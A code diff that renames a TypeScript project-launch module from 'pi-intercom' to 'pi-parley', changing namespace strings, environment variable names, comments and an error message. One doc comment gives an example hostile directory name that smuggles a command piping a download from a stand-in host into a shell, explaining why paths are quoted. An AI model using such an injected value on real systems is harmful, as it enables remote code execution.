@@ -16,17 +16,17 @@ const LAUNCH_COMMAND_MAX_LENGTH = 1024;
 /**
  * Generic project-launch integration.
  *
- * pi-intercom never depends on a specific terminal manager. Any live
- * intercom session -- Herdr, FlightDeck, a tmux helper, or anything else --
+ * pi-parley never depends on a specific terminal manager. Any live
+ * parley session -- Herdr, FlightDeck, a tmux helper, or anything else --
  * registers as a project-launch provider by advertising this extension
  * capability namespace, then answers launch requests delivered as ordinary
- * intercom messages. Machines without a live provider can configure a
- * default launch command (PI_INTERCOM_PROJECT_LAUNCHER or config
+ * parley messages. Machines without a live provider can configure a
+ * default launch command (PI_PARLEY_PROJECT_LAUNCHER or config
  * "projectLauncher"); there is no built-in default.
  */
-export const PROJECT_LAUNCH_NAMESPACE = "pi-intercom/project-launch-v1";
+export const PROJECT_LAUNCH_NAMESPACE = "pi-parley/project-launch-v1";
 
-export const PROJECT_LAUNCH_REQUEST_TYPE = "pi-intercom/project-launch-request";
+export const PROJECT_LAUNCH_REQUEST_TYPE = "pi-parley/project-launch-request";
 
 export interface ProjectLaunchRequest {
   type: typeof PROJECT_LAUNCH_REQUEST_TYPE;
@@ -151,7 +151,7 @@ export function resolveProjectLauncherCommand(
   env: NodeJS.ProcessEnv = process.env,
   configured?: string,
 ): string | undefined {
-  const fromEnv = env.PI_INTERCOM_PROJECT_LAUNCHER?.trim();
+  const fromEnv = env.PI_PARLEY_PROJECT_LAUNCHER?.trim();
   if (fromEnv) return fromEnv;
   const fromConfig = configured?.trim();
   return fromConfig ? fromConfig : undefined;
@@ -164,11 +164,11 @@ function shellQuotePath(value: string): string {
 
 /**
  * Runs the configured default launch command. `{root}` is substituted with a
- * safely shell-quoted project root — write it bare (pi-intercom adds the
+ * safely shell-quoted project root — write it bare (pi-parley adds the
  * quoting), so a hostile directory name like "/tmp/x; curl evil|sh" can never
  * break out of the argument. The unquoted root is exported as
- * PI_INTERCOM_PROJECT_ROOT for commands that need it verbatim. The command
- * runs in the project root, detached, and pi-intercom does not manage or wait
+ * PI_PARLEY_PROJECT_ROOT for commands that need it verbatim. The command
+ * runs in the project root, detached, and pi-parley does not manage or wait
  * for the terminal it creates.
  */
 export async function launchProjectCommand(
@@ -192,7 +192,7 @@ export async function launchProjectCommand(
         shell: true,
         windowsHide: true,
         cwd: root,
-        env: { ...process.env, PI_INTERCOM_PROJECT_ROOT: root },
+        env: { ...process.env, PI_PARLEY_PROJECT_ROOT: root },
         detached: true,
       });
     } catch (cause) {
@@ -310,7 +310,7 @@ export async function openProjectPane(input: {
   } catch (cause) {
     throw new ProjectLaunchError(errorText(cause), { stage: "launch", cause });
   }
-  const command = process.env.PI_INTERCOM_PI_BIN?.trim() || process.env.PI_BIN?.trim() || "pi";
+  const command = process.env.PI_PARLEY_PI_BIN?.trim() || process.env.PI_BIN?.trim() || "pi";
   const provider = findProjectLaunchProvider(input.sessions, input.currentSessionId);
   if (provider) {
     const launch: ProjectPaneLaunch = {
@@ -366,8 +366,8 @@ export async function openProjectPane(input: {
   }
   throw new ProjectLaunchError(
     "No project launcher is available. No launch was attempted. Local project launch is supported through a visible session advertising "
-    + `the "${PROJECT_LAUNCH_NAMESPACE}" capability or a configured PI_INTERCOM_PROJECT_LAUNCHER (config "projectLauncher"). `
-    + "Neither is available in this session; intercom does not supply a terminal manager.",
+    + `the "${PROJECT_LAUNCH_NAMESPACE}" capability or a configured PI_PARLEY_PROJECT_LAUNCHER (config "projectLauncher"). `
+    + "Neither is available in this session; parley does not supply a terminal manager.",
     { stage: "launch" },
   );
 }
